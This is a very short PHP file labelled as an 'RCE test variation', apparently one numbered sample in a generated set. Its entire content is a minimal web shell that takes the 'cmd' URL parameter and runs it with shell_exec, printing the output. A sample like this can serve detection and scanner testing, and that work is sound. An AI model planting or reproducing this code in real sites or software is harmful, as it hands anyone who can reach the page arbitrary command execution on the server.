<?php
// RCE test variation #580
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>